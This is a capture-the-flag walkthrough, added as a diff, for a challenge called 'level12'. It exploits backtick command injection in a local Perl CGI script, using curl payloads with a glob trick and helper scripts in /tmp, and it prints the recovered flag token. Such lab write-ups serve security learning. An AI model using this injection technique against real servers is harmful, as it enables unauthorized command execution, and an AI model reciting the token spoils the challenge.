@@ -1,0 +1,39 @@
+1. List files in the directory:
+   ll
+   # Output shows: level12.pl Perl CGI script with SUID permissions owned by flag12
+
+2. Analyze the Perl script:
+   cat level12.pl
+   # CGI script running on localhost:4646
+   # Takes parameters x and y
+   # Vulnerable line: @output = `egrep "^$xx" /tmp/xd 2>&1`;
+   # Command injection possible through backticks execution
+
+3. Initial test with simple command:
+   echo 'getflag' > /tmp/LEVEL12
+   chmod +x /tmp/LEVEL12
+   curl 'http://localhost:4646?x=//*/LEVEL12&y=1'
+   # Output: . (single dot, indicating return value 0)
+
+4. Test command injection with backticks:
+   curl "http://localhost:4646?x=\`/*/LEVEL12\`&y=.*"
+   # Output: .. (double dots, indicating return value 1)
+
+5. Create script to capture flag output:
+   rm -r /tmp/LEVEL12
+   echo 'getflag > /tmp/flag' > /tmp/SCRIPT
+   chmod +x /tmp/SCRIPT
+
+6. Execute the exploit:
+   curl "http://localhost:4646?x=\`/*/SCRIPT\`&y=.*"
+   # Output: .. (command executed successfully)
+
+7. Check the result:
+   cat /tmp/flag
+   # Output: Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+TECHNIQUE: Command injection via backticks in Perl CGI
+VULNERABILITY: Unsanitized input used in backticks execution context
+PAYLOAD: `//*/SCRIPT` - Command substitution through file globbing
+EXPLOIT: Created executable script that redirects getflag output to file
+TOKEN: g1qKMiRpXf53AWhDaU7FEkczr
